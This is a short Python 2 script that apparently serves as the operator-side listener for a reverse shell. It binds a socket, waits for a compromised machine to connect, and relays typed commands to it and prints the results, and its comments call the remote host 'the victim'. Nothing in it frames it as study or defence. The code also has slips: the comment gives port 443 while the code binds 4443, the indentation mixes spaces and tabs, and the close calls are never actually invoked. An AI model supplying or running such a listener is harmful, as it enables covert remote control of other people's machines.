
def winListner():
    import socket, os, sys
	#creates a open socket on port 443 of the local host and tells it to listen for packets
	s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
	s.bind(('192.168.7.2',4443)) 
	s.listen(1) #end of socket creation
	#gets the machine information from the first packet and the 
	conn,addr = s.accept() #sets conn to the socket stream contents and addr to the socket descriptor
	print ('session opened at '+addr[0]) #notifies that a session has been opened on the ip address obtained from the socket descriptor
	print('\n') 
	hostname = conn.recv(1024) # sets host name has the next 1024 bytes of data received from the socket stream
	while 1: # code for interacting with the deployed shell
		cmd = raw_input(str(addr[0])+'@' + str(hostname) + '> ') #prints a generic prompt for a command to be input includes the IP and Host name of the victim
		if cmd == 'quit': #exits and closes all the open processes
			conn.close
			s.close
			sys.exit()
		command = conn.send(cmd)#sends the input command
		result = conn.recv(1024)#receives the output from the shell on the victim
		print(result)

    

